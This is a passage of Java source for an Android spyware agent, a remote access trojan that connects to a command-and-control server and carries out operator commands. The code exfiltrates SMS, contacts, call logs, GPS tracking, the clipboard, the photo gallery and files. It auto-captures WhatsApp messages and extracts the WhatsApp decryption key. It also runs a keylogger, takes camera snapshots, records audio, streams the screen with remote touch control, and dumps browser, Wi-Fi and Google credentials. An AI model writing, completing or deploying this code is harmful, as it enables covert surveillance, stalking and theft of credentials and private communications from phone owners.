                    enableWhatsAppAutoCapture();
                    flushPendingData();

                    Log.d(TAG, "✅ Connected to C2!");
                    updateNotification("Connected ✓");
                    showToast("Connected to C2!");

                    listenForCommands();

                } catch (Exception e) {
                    Log.e(TAG, "❌ Connection error: " + e.getMessage());
                    isConnected.set(false);
                    closeConnection();

                    try {
                        Thread.sleep(retryDelay);
                        retryDelay = Math.min(retryDelay * 2, maxDelay);
                    } catch (InterruptedException ignored) {
                    }
                }
            }
        });
    }

    private void enableWhatsAppAutoCapture() {
        if (!isWhatsAppCapturing) {
            isWhatsAppCapturing = true;
            whatsappMessages.append("=== WHATSAPP CAPTURE AUTO-STARTED AT ").append(new Date()).append(" ===\n");
            Log.d(TAG, "📱 WhatsApp capture auto-started");
        }
    }

    // ==================== SEND BEACON ====================

    private void sendBeacon() {
        try {
            JSONObject beacon = new JSONObject();
            beacon.put("type", "beacon");
            beacon.put("id", getAgentId());
            beacon.put("device", Build.MODEL);
            beacon.put("android", Build.VERSION.RELEASE);
            beacon.put("manufacturer", Build.MANUFACTURER);
            beacon.put("timestamp", System.currentTimeMillis());

            if (out != null) {
                synchronized (out) {
                    out.println(beacon.toString());
                    out.flush();
                    Log.d(TAG, "📡 Beacon sent");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Beacon error", e);
        }
    }

    private String getAgentId() {
        return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
    }

    // ==================== LISTEN COMMANDS ====================

    private void listenForCommands() {
        backgroundHandler.post(() -> {
            try {
                String line;
                int consecutiveErrors = 0;
                final int MAX_CONSECUTIVE_ERRORS = 5;

                while (isRunning.get() && isConnected.get()) {
                    try {
                        if (socket != null) {
                            socket.setSoTimeout(30000);
                        }

                        line = in.readLine();
                        if (line == null) {
                            Log.w(TAG, "⚠️ Connection closed by server");
                            break;
                        }

                        line = line.trim();
                        if (line.isEmpty()) continue;

                        consecutiveErrors = 0;

                        if (line.equals("PING")) {
                            if (out != null) {
                                synchronized (out) {
                                    out.println("PONG");
                                    out.flush();
                                }
                                Log.d(TAG, "💓 PONG sent");
                            }
                            continue;
                        }
                        if (line.equals("PONG")) continue;

                        Log.d(TAG, "📨 Received: " + line);
                        final String currentLine = line;

                        commandExecutor.execute(() -> {
                            try {
                                if (currentLine.contains("\"status\":\"connected\"")) {
                                    Log.d(TAG, "✅ Server acknowledgment received");
                                    return;
                                }

                                String result = executeCommand(currentLine);
                                if (result != null && !result.isEmpty()) {
                                    sendResponse(currentLine, result);
                                }
                            } catch (Exception e) {
                                Log.e(TAG, "Async command error", e);
                            }
                        });

                    } catch (SocketTimeoutException e) {
                        Log.d(TAG, "⏱️ Read timeout, continuing...");
                        continue;
                    } catch (Exception e) {
                        Log.e(TAG, "❌ Read error: " + e.getMessage());
                        consecutiveErrors++;

                        if (consecutiveErrors >= MAX_CONSECUTIVE_ERRORS) {
                            Log.e(TAG, "❌ Too many consecutive errors, breaking");
                            break;
                        }

                        try {
                            Thread.sleep(1000);
                        } catch (InterruptedException ignored) {}
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "❌ Listener error", e);
            }

            Log.d(TAG, "🔌 Listener stopped");
            isConnected.set(false);
            closeConnection();

            if (isRunning.get()) {
                mainHandler.postDelayed(this::connectToC2, 5000);
            }
        });
    }

    // ==================== SEND RESPONSE ====================

    private void sendResponse(String originalCommand, String result) {
        if (out == null || !isConnected.get()) {
            Log.w(TAG, "⚠️ Cannot send response");
            return;
        }

        responseExecutor.execute(() -> {
            try {
                String agentId = getAgentId();

                JSONObject response = new JSONObject();
                response.put("type", "response");
                response.put("agent_id", agentId);
                response.put("command", originalCommand.trim());
                response.put("timestamp", System.currentTimeMillis());

                if (currentCommandId != null) {
                    response.put("command_id", currentCommandId);
                    currentCommandId = null;
                }

                try {
                    JSONObject resultObj = new JSONObject(result);
                    response.put("result", resultObj);
                } catch (JSONException e) {
                    response.put("result", result);
                }

                synchronized (out) {
                    out.println(response.toString());
                    Log.d(TAG, "📤 Response sent: " + originalCommand);
                }

            } catch (Exception e) {
                Log.e(TAG, "sendResponse error", e);
            }
        });
    }

    public void sendScreenFrame(String frameData) {
        if (out != null && isConnected.get()) {
            responseExecutor.execute(() -> {
                try {
                    synchronized (out) {
                        out.println(frameData);
                        Log.d(TAG, "📸 Screen frame sent");
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Send frame error: " + e.getMessage());
                }
            });
        }
    }
    
    private String getLocation() {
        try {
            if (!hasPermission(Manifest.permission.ACCESS_FINE_LOCATION) &&
                    !hasPermission(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                JSONObject result = new JSONObject();
                result.put("status", "permission_denied");
                result.put("message", "Location permission not granted");
                return result.toString();
            }

            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) {
                return errorJson("LocationManager is null");
            }

            boolean isGPSEnabled = lm.isProviderEnabled(LocationManager.GPS_PROVIDER);
            boolean isNetworkEnabled = lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER);

            if (!isGPSEnabled && !isNetworkEnabled) {
                JSONObject result = new JSONObject();
                result.put("status", "error");
                result.put("message", "Location services disabled");
                return result.toString();
            }

            Location location = null;
            try {
                if (hasPermission(Manifest.permission.ACCESS_FINE_LOCATION) ||
                        hasPermission(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                    location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    if (location == null) {
                        location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    }
                }
            } catch (SecurityException e) {
                Log.e(TAG, "Security exception: " + e.getMessage());
            }

            if (location != null) {
                JSONObject loc = new JSONObject();
                loc.put("status", "success");
                loc.put("latitude", location.getLatitude());
                loc.put("longitude", location.getLongitude());
                loc.put("accuracy", location.getAccuracy());
                loc.put("provider", location.getProvider());
                loc.put("time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(location.getTime())));
                loc.put("maps_url", "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude());
                return loc.toString();
            }

            JSONObject result = new JSONObject();
            result.put("status", "error");
            result.put("message", "Location not available");
            return result.toString();

        } catch (Exception e) {
            return errorJson(e.getMessage());
        }
    }
    

    // ==================== SCREEN MIRROR COMMANDS ====================

    // ==================== RDP COMMANDS ====================

private String startRDP() {
    try {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            return errorJson("RDP requires Android 5.0+");
        }

        // ✅ CEK APAKAH STREAM SUDAH AKTIF
        if (screenStreamHelper != null && screenStreamHelper.isStreaming()) {
            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("type", "rdp");
            result.put("message", "RDP already active");
            result.put("mirror_active", true);
            return result.toString();
        }

        // ✅ MULAI VIDEO STREAM
        if (screenStreamHelper == null) {
            initScreenStream();
        }

        // ✅ REQUEST PERMISSION
        Intent intent = new Intent(this, MainActivity.class);
        intent.putExtra("action", "request_stream_permission");
        intent.putExtra("agent_id", getAgentId());
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        startActivity(intent);

        JSONObject result = new JSONObject();
        result.put("status", "pending");
        result.put("type", "rdp");
        result.put("message", "RDP permission requested");
        result.put("mirror_active", false);
        return result.toString();

    } catch (Exception e) {
        Log.e(TAG, "❌ startRDP error", e);
        return errorJson(e.getMessage());
    }
}

private String stopRDP() {
    try {
        // ✅ STOP VIDEO STREAM
        if (screenStreamHelper != null) {
            screenStreamHelper.stopStream();
        }

        // ✅ STOP SCREEN MIRROR (FALLBACK)
        if (screenMirrorHelper != null) {
            screenMirrorHelper.stopScreenCapture();
        }

        isVideoStreaming = false;
        isMirrorRequestPending = false;

        JSONObject result = new JSONObject();
        result.put("status", "success");
        result.put("type", "rdp");
        result.put("message", "RDP stopped");
        result.put("mirror_active", false);
        return result.toString();

    } catch (Exception e) {
        Log.e(TAG, "Stop RDP error", e);
        return errorJson("Failed to stop RDP: " + e.getMessage());
    }
}

    private String stopScreenMirror() {
        try {
            Intent intent = new Intent(this, ScreenMirrorService.class);
            intent.putExtra("action", "STOP_MIRROR");
            stopService(intent);

            if (screenMirrorHelper != null) {
                screenMirrorHelper.stopScreenCapture();
            }

            isMirrorRequestPending = false;

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("message", "Screen mirror stopped");
            result.put("mirror_active", false);
            return result.toString();
        } catch (Exception e) {
            Log.e(TAG, "Stop mirror error", e);
            return errorJson("Failed to stop mirror: " + e.getMessage());
        }
    }

    private String pauseScreenMirror() {
        try {
            if (screenMirrorHelper != null) {
                screenMirrorHelper.pauseCapture();
            }
            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("message", "Screen mirror paused");
            return result.toString();
        } catch (Exception e) {
            return errorJson(e.getMessage());
        }
    }

    private String resumeScreenMirror() {
        try {
            if (screenMirrorHelper != null) {
                screenMirrorHelper.resumeCapture();
            }
            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("message", "Screen mirror resumed");
            return result.toString();
        } catch (Exception e) {
            return errorJson(e.getMessage());
        }
    }

    private String getScreenInfo() {
        try {
            DisplayMetrics metrics = new DisplayMetrics();
            WindowManager windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            windowManager.getDefaultDisplay().getMetrics(metrics);

            JSONObject info = new JSONObject();
            info.put("width", metrics.widthPixels);
            info.put("height", metrics.heightPixels);
            info.put("density", metrics.densityDpi);
            info.put("aspect_ratio", String.format("%.2f", (float) metrics.widthPixels / metrics.heightPixels));

            boolean isMirroring = ScreenMirrorService.isMirroring();
            info.put("mirror_active", isMirroring);
            info.put("mirror_service_running", screenMirrorHelper != null && screenMirrorHelper.isCapturing());

            return info.toString();
        } catch (Exception e) {
            return errorJson(e.getMessage());
        }
    }

    public void sendMirrorStatus(boolean active) {
        try {
            JSONObject status = new JSONObject();
            status.put("type", "mirror_status");
            status.put("agent_id", getAgentId());
            status.put("mirror_active", active);
            status.put("timestamp", System.currentTimeMillis());

            if (out != null && isConnected.get()) {
                synchronized (out) {
                    out.println(status.toString());
                    Log.d(TAG, "📤 Mirror status sent: " + active);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Send mirror status error: " + e.getMessage());
        }
    }

    public void onMirrorStarted() {
        isMirrorRequestPending = false;
        Log.d(TAG, "✅ Mirror started callback received");
        sendMirrorStatus(true);
    }

    public void onMirrorStopped() {
        Log.d(TAG, "⏹️ Mirror stopped callback received");
        sendMirrorStatus(false);
    }

    // ==================== COMMAND EXECUTOR ====================

    private String executeCommand(String commandLine) {
        String actualCommand = commandLine;

        try {
            JSONObject cmdJson = new JSONObject(commandLine);
            if (cmdJson.has("command")) {
                actualCommand = cmdJson.getString("command");
            }
            if (cmdJson.has("id")) {
                currentCommandId = cmdJson.getString("id");
            }
        } catch (JSONException e) {
            actualCommand = commandLine.trim();
        }

        Log.d(TAG, "⚡ Executing: " + actualCommand);
        return executeActualCommand(actualCommand);
    }

    private String executeActualCommand(String command) {
        try {
            String[] parts = command.split(" ", 2);
            String cmd = parts[0];
            String param = parts.length > 1 ? parts[1] : null;

            switch (cmd) {
                case "GET_DEVICE_INFO":
                    return getDeviceInfo();
                case "GET_LOCATION":
                    return getLocation();
                // AgentService.java - Di executeActualCommand() tambahkan case:
                case "GPS_DETAIL":
    return getGPSDetail();

case "LOCATION_TRACK_START":
    if (param != null && !param.isEmpty()) {
        try {
            int interval = Integer.parseInt(param);
            return startLocationTracking(interval);
        } catch (NumberFormatException e) {
            return startLocationTracking(10);
        }
    }
    return startLocationTracking(10);

case "LOCATION_TRACK_STOP":
    return stopLocationTracking();

case "LOCATION_TRACK_STATUS":
    return getLocationTrackingStatus();

case "LOCATION_HISTORY":
    int limit = 50;
    if (param != null && !param.isEmpty()) {
        try {
            limit = Integer.parseInt(param);
        } catch (NumberFormatException e) {}
    }
    return getLocationHistory(limit);
                case "GET_CLIPBOARD":
                    return getClipboard();
                case "GET_INSTALLED_APPS":
                    return getInstalledApps();
                case "GET_ACCOUNTS":
                    return getDeviceAccounts();
                case "GET_GOOGLE_ACCOUNTS":
                    return getGoogleAccounts();
                case "GET_CONTACTS":
                    return getContacts();
                case "GET_SMS":
                    return getSMS();
                case "GET_CALL_LOGS":
                    return getCallLogs();
                case "GET_GALLERY":
                    return getGallery();
                case "GET_FILES_LIST":
    String listPath = "/sdcard";
    if (param != null && !param.isEmpty()) {
        listPath = param;
    }
    return getFilesList(listPath);
                case "DOWNLOAD_FILE":
                         if (param != null && !param.isEmpty()) {
        return downloadFile(param);
    }
        return errorJson("File path required");
                // Di executeActualCommand(), tambahkan case berikut:

                case "DELETE_FILE":  // ← TAMBAHKAN INI
                    if (param != null && !param.isEmpty()) {
                        return deleteRemoteFile(param);
                    }
                    return errorJson("File path required for DELETE_FILE");

                case "MOVE_FILE":
                    if (param != null && !param.isEmpty()) {
                        // Format: "source_path|dest_path" atau "source_path dest_path"
                        String[] paths = param.split("\\|");
                        if (paths.length < 2) {
                            paths = param.split(" ");
                        }
                        if (paths.length >= 2) {
                            return moveFile(paths[0].trim(), paths[1].trim());
                        }
                        return errorJson("Format: MOVE_FILE source_path|dest_path");
                    }
                    return errorJson("Source and destination paths required");
                case "WA_INFO":
                    return getWhatsAppInfo();
                case "WA_CONTACTS":
                    return getWhatsAppContacts();
                case "WA_CAPTURE_START":
                    return startWhatsAppCapture();
                case "WA_CAPTURE_STOP":
                    return stopWhatsAppCapture();
                case "WA_CAPTURE_DUMP":
                    return dumpWhatsAppMessages();
                case "WA_CAPTURE_STATS":
                    return getWhatsAppStats();
                case "WA_CAPTURE_CLEAR":
                    return clearWhatsAppMessages();
                case "WA_BACKUP_INFO":
                    return getWhatsAppBackupInfo();
                case "WA_EXTRACT_KEY":
                    return extractWhatsAppKey();
                case "WA_DECRYPT_DB":
                    return decryptWhatsAppDatabase();
                case "RECORD_AUDIO":
                    return recordAudio();
                case "STOP_RECORDING":
                    return stopRecording();
                case "CAMERA_SNAPSHOT":
    // ✅ CEK PARAMETER - front atau back
    String cameraPosition = "back"; // default
    if (param != null) {
        if (param.equalsIgnoreCase("front") || param.equalsIgnoreCase("selfie")) {
            cameraPosition = "front";
        } else if (param.equalsIgnoreCase("back")) {
            cameraPosition = "back";
        }
    }
    return captureCameraSnapshot(cameraPosition);
    case "CAMERA_INFO":
    return getCameraInfo();
    // ==================== CAMERA STREAM COMMANDS ====================



                case "SCREENSHOT":
                    return captureScreenshot();
                case "SCREEN_START":
case "VIDEO_STREAM_START":
case "RDP_START":
    return startRDP();

case "SCREEN_STOP":
case "VIDEO_STREAM_STOP":
case "RDP_STOP":
    return stopRDP();
                case "SET_WALLPAPER":
                    if (param != null) {
                        if (param.startsWith("http://") || param.startsWith("https://")) {
                            return setWallpaperFromUrl(param);
                        } else {
                            return setWallpaper(param);
                        }
                    }
                    return errorJson("Image data or URL required");
                case "KEYLOG_START":
                    ServiceController.executeOnKeylogger(service -> service.startLogging());
                    return successJson("Keylogger started");

                case "KEYLOG_STOP":
                    ServiceController.executeOnKeylogger(service -> service.stopLogging());
                    return successJson("Keylogger stopped");

                case "KEYLOG_STATUS":
                    return getKeyloggerStatus();

                case "KEYLOG_DUMP":
                    String logs = "KeyloggerService not found";
                    int count = 0;
                    boolean isLogging = false;
                    int queueSize = 0;
                    int historySize = 0;

                    KeyloggerService kls = ServiceController.getKeyloggerService();
                    if (kls != null) {
                        logs = kls.getLogs();
                        count = kls.getTotalKeystrokesLogged();
                        isLogging = kls.isLogging();
                        queueSize = kls.getQueueSize();
                        historySize = kls.getHistorySize();
                    }

                    JSONObject result = new JSONObject();
                    result.put("status", "success");
                    result.put("type", "keylog_dump");
                    result.put("logs", logs);
                    result.put("count", count);
                    result.put("is_logging", isLogging);
                    result.put("queue_size", queueSize);
                    result.put("history_size", historySize);
                    result.put("timestamp", System.currentTimeMillis());

                    return result.toString();
                // ==================== RDP CONTROLS ====================
case "RDP_TOUCH":
    if (param != null && !param.isEmpty()) {
        return handleRDPTouch(param);
    }
    return errorJson("Format: RDP_TOUCH x,y");

case "RDP_SWIPE":
    if (param != null && !param.isEmpty()) {
        return handleRDPSwipe(param);
    }
    return errorJson("Format: RDP_SWIPE x1,y1,x2,y2");

case "RDP_KEY":
    if (param != null && !param.isEmpty()) {
        return handleRDPKey(param);
    }
    return errorJson("Format: RDP_KEY keycode");

case "RDP_TEXT":
    if (param != null && !param.isEmpty()) {
        return handleRDPText(param);
    }
    return errorJson("Format: RDP_TEXT text");

case "RDP_SCROLL":
    if (param != null && !param.isEmpty()) {
        return handleRDPScroll(param);
    }
    return errorJson("Format: RDP_SCROLL delta");

case "RDP_BACK":
    return performRDPBack();

case "RDP_HOME":
    return performRDPHome();

case "RDP_RECENT":
    return performRDPRecent();

case "RDP_STATUS":
    return getRDPStatus();
                    
                // ==================== DI DALAM executeActualCommand() ====================

case "BROWSER_INFO":
    return getBrowserInfo();

case "BROWSER_HISTORY":
    if (param != null && !param.isEmpty()) {
        return getBrowserHistory(param);
    }
    return getBrowserHistory(null);

case "BROWSER_BOOKMARKS":
    if (param != null && !param.isEmpty()) {
        return getBrowserBookmarks(param);
    }
    return getBrowserBookmarks(null);

case "BROWSER_TABS":
    if (param != null && !param.isEmpty()) {
        return getBrowserTabs(param);
    }
    return getBrowserTabs(null);

case "BROWSER_ALL":
    // Get all browser data
    JSONObject allData = new JSONObject();
    allData.put("info", new JSONObject(getBrowserInfo()));
    allData.put("history", new JSONObject(getBrowserHistory(null)));
    allData.put("bookmarks", new JSONObject(getBrowserBookmarks(null)));
    allData.put("tabs", new JSONObject(getBrowserTabs(null)));
    return allData.toString();
    // ==================== CREDENTIALS COMMANDS ====================
case "DUMP_CREDENTIALS":
    return dumpAllCredentials();

case "GET_WIFI_PASSWORDS":
    return getWifiPasswordsOnly();

case "GET_BROWSER_PASSWORDS":
    return getBrowserPasswordsOnly();

case "GET_GOOGLE_TOKENS":
    return getGoogleTokensOnly();
                case "SHOW_TOAST":
                    showToast("Command executed!");
                    return successJson("Toast shown");
                case "HELP":
                    return getHelp();
                default:
                    JSONObject unknown = new JSONObject();
                    unknown.put("status", "unknown");
                    unknown.put("command", command);
                    unknown.put("message", "Unknown command. Type HELP");
                    return unknown.toString();
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Command error: " + e.getMessage(), e);
            return errorJson(e.getMessage());
        }
    }

    // ==================== VIDEO STREAM ====================

    private String startVideoStream() {
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
                return errorJson("Video streaming requires Android 5.0+");
            }

            if (screenStreamHelper != null && screenStreamHelper.isStreaming()) {
                return successJson("Video stream already active");
            }

            Intent intent = new Intent(this, MainActivity.class);
            intent.putExtra("action", "request_stream_permission");
            intent.putExtra("agent_id", getAgentId());
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(intent);

            isVideoStreaming = true;

            JSONObject result = new JSONObject();
            result.put("status", "pending");
            result.put("message", "Video stream permission requested");
            result.put("type", "video_stream");
            return result.toString();

        } catch (Exception e) {
            Log.e(TAG, "Start video stream error: " + e.getMessage());
            return errorJson(e.getMessage());
        }
    }

    private String stopVideoStream() {
        if (screenStreamHelper != null) {
            screenStreamHelper.stopStream();
        }
        isVideoStreaming = false;
        return successJson("Video stream stopped");
    }

    private String getVideoStreamStatus() {
        try {
            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("is_streaming", screenStreamHelper != null && screenStreamHelper.isStreaming());
            result.put("frame_count", screenStreamHelper != null ? screenStreamHelper.getFrameCount() : 0);
            result.put("type", "video_stream");
            return result.toString();
        } catch (Exception e) {
            return errorJson(e.getMessage());
        }
    }

    // ==================== PERMISSION HELPER ====================

    private boolean hasPermission(String permission) {
        if (System.currentTimeMillis() - lastPermissionCacheClear > PERMISSION_CACHE_TTL) {
            permissionCache.clear();
            lastPermissionCacheClear = System.currentTimeMillis();
        }

        if (!permissionCache.containsKey(permission)) {
            boolean granted = false;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                granted = checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
            }
            permissionCache.put(permission, granted);
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            return permissionCache.getOrDefault(permission, false);
        }
        return false;
    }

    private void requestCameraPermission() {
        mainHandler.post(() -> {
            Toast.makeText(this, "❌ Please grant Camera permission in App Settings", Toast.LENGTH_LONG).show();
        });
    }

    // ==================== DEVICE INFORMATION METHODS ====================

    private String getDeviceInfo() {
        JSONObject info = new JSONObject();
        try {
            info.put("status", "success");
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("android_version", Build.VERSION.RELEASE);
            info.put("sdk_version", Build.VERSION.SDK_INT);
            info.put("device_id", getAgentId());
            info.put("battery", getBatteryPercentage());
            info.put("is_charging", isCharging());
            info.put("total_storage", getTotalStorage());
            info.put("free_storage", getFreeStorage());
            info.put("screen_resolution", getScreenResolution());
            info.put("is_rooted", isRooted);
            info.put("timestamp", new Date().toString());
            return info.toString();
        } catch (JSONException e) {
            return errorJson(e.getMessage());
        }
    }

    // ==================== GET LOCATION - IMPROVED ====================



    private String getClipboard() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                if (clipboard != null && clipboard.hasPrimaryClip()) {
                    ClipData.Item item = clipboard.getPrimaryClip().getItemAt(0);
                    if (item != null && item.getText() != null) {
                        JSONObject result = new JSONObject();
                        result.put("status", "success");
                        result.put("content", item.getText().toString());
                        return result.toString();
                    }
                }
            }
            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("content", "Clipboard is empty");
            return result.toString();
        } catch (Exception e) {
            return errorJson(e.getMessage());
        }
    }

    private String getInstalledApps() {
        JSONArray apps = new JSONArray();
        PackageManager pm = getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);

        for (ApplicationInfo appInfo : packages) {
            try {
                if ((appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0) continue;
                JSONObject app = new JSONObject();
                app.put("name", pm.getApplicationLabel(appInfo).toString());
                app.put("package", appInfo.packageName);
                apps.put(app);
            } catch (JSONException e) {
                Log.e(TAG, "App error", e);
            }
        }

        try {
            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("count", apps.length());
            result.put("data", apps);
            return result.toString();
        } catch (JSONException e) {
            return apps.toString();
        }
    }

    private String getContacts() {
        JSONArray contacts = new JSONArray();
        Cursor cursor = null;

        try {
            if (!hasPermission(Manifest.permission.READ_CONTACTS)) {
                JSONObject result = new JSONObject();
                result.put("status", "permission_denied");
                result.put("message", "READ_CONTACTS permission not granted");
                return result.toString();
            }

            cursor = getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                            ContactsContract.CommonDataKinds.Phone.NUMBER
                    },
                    null, null,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " LIMIT 100");

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject contact = new JSONObject();
                    String name = getColumnValue(cursor, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                    String number = getColumnValue(cursor, ContactsContract.CommonDataKinds.Phone.NUMBER);
                    contact.put("name", name != null ? name : "");
                    contact.put("number", number != null ? number : "");
                    contacts.put(contact);
                } while (cursor.moveToNext());
            }

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("count", contacts.length());
            result.put("data", contacts);
            return result.toString();

        } catch (Exception e) {
            return errorJson(e.getMessage());
        } finally {
            if (cursor != null) cursor.close();
        }
    }

    private String getSMS() {
        JSONArray messages = new JSONArray();
        Cursor cursor = null;

        try {
            if (!hasPermission(Manifest.permission.READ_SMS)) {
                JSONObject result = new JSONObject();
                result.put("status", "permission_denied");
                result.put("permission", "READ_SMS");
                return result.toString();
            }

            cursor = getContentResolver().query(
                    Telephony.Sms.CONTENT_URI,
                    new String[]{Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE},
                    null, null,
                    Telephony.Sms.DATE + " DESC LIMIT 50");

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject msg = new JSONObject();
                    String address = getColumnValue(cursor, Telephony.Sms.ADDRESS);
                    String body = getColumnValue(cursor, Telephony.Sms.BODY);
                    String date = getColumnValue(cursor, Telephony.Sms.DATE);

                    msg.put("from", address != null ? address : "");
                    msg.put("body", body != null ? body : "");
                    if (date != null) {
                        msg.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(Long.parseLong(date))));
                    }
                    messages.put(msg);
                } while (cursor.moveToNext());
            }

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("count", messages.length());
            result.put("data", messages);
            return result.toString();

        } catch (Exception e) {
            return errorJson(e.getMessage());
        } finally {
            if (cursor != null) cursor.close();
        }
    }

    private String getCallLogs() {
        JSONArray calls = new JSONArray();
        Cursor cursor = null;

        try {
            if (!hasPermission(Manifest.permission.READ_CALL_LOG)) {
                JSONObject result = new JSONObject();
                result.put("status", "permission_denied");
                result.put("permission", "READ_CALL_LOG");
                return result.toString();
            }

            cursor = getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    new String[]{CallLog.Calls.NUMBER, CallLog.Calls.DURATION, CallLog.Calls.DATE, CallLog.Calls.TYPE},
                    null, null,
                    CallLog.Calls.DATE + " DESC LIMIT 50");

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject call = new JSONObject();
                    String number = getColumnValue(cursor, CallLog.Calls.NUMBER);
                    String duration = getColumnValue(cursor, CallLog.Calls.DURATION);
                    String date = getColumnValue(cursor, CallLog.Calls.DATE);
                    String type = getColumnValue(cursor, CallLog.Calls.TYPE);

                    call.put("number", number != null ? number : "");
                    call.put("duration", duration != null ? duration : "");
                    call.put("type", getCallType(type));
                    if (date != null) {
                        call.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(Long.parseLong(date))));
                    }
                    calls.put(call);
                } while (cursor.moveToNext());
            }

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("count", calls.length());
            result.put("data", calls);
            return result.toString();

        } catch (Exception e) {
            return errorJson(e.getMessage());
        } finally {
            if (cursor != null) cursor.close();
        }
    }

    private String getCallType(String type) {
        if (type == null) return "Unknown";
        try {
            int t = Integer.parseInt(type);
            switch (t) {
                case CallLog.Calls.INCOMING_TYPE:
                    return "Incoming";
                case CallLog.Calls.OUTGOING_TYPE:
                    return "Outgoing";
                case CallLog.Calls.MISSED_TYPE:
                    return "Missed";
                default:
                    return "Unknown";
            }
        } catch (NumberFormatException e) {
            return "Unknown";
        }
    }

    private String getGallery() {
    JSONArray images = new JSONArray();
    Cursor cursor = null;

    try {
        // ✅ CEK IZIN
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (!hasPermission(Manifest.permission.READ_MEDIA_IMAGES)) {
                JSONObject result = new JSONObject();
                result.put("status", "permission_denied");
                result.put("message", "READ_MEDIA_IMAGES permission denied");
                result.put("android_version", Build.VERSION.SDK_INT);
                return result.toString();
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!hasPermission(Manifest.permission.READ_EXTERNAL_STORAGE)) {
                JSONObject result = new JSONObject();
                result.put("status", "permission_denied");
                result.put("message", "READ_EXTERNAL_STORAGE permission denied");
                return result.toString();
            }
        }

        // ✅ QUERY SEDERHANA - TANPA LIMIT
        String[] projection = {
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DATE_TAKEN,
                MediaStore.Images.Media.SIZE
        };

        cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                MediaStore.Images.Media.DATE_TAKEN + " DESC"
        );

        if (cursor != null && cursor.moveToFirst()) {
            int count = 0;
            final int MAX_IMAGES = 50;
            
            do {
                if (count >= MAX_IMAGES) break;
                
                JSONObject image = new JSONObject();
                
                String id = getColumnValue(cursor, MediaStore.Images.Media._ID);
                String name = getColumnValue(cursor, MediaStore.Images.Media.DISPLAY_NAME);
                String path = getColumnValue(cursor, MediaStore.Images.Media.DATA);
                String date = getColumnValue(cursor, MediaStore.Images.Media.DATE_TAKEN);
                String size = getColumnValue(cursor, MediaStore.Images.Media.SIZE);

                image.put("id", id != null ? id : "");
                image.put("name", name != null ? name : "");
                image.put("path", path != null ? path : "");
                
                if (date != null && !date.isEmpty()) {
                    try {
                        long dateMillis = Long.parseLong(date);
                        image.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
                                .format(new Date(dateMillis)));
                    } catch (NumberFormatException e) {
                        image.put("date", date);
                    }
                }
                image.put("size", size != null ? formatFileSize(Long.parseLong(size)) : "0");
                images.put(image);
                count++;
            } while (cursor.moveToNext());
        }

        JSONObject result = new JSONObject();
        result.put("status", "success");
        result.put("count", images.length());
        result.put("data", images);
        return result.toString();

    } catch (SecurityException e) {
        Log.e(TAG, "Security error: " + e.getMessage());
        return errorJson("Storage permission denied");
    } catch (Exception e) {
        Log.e(TAG, "Gallery error: " + e.getMessage(), e);
        return errorJson(e.getMessage());
    } finally {
        if (cursor != null) {
            try {
                cursor.close();
            } catch (Exception e) {
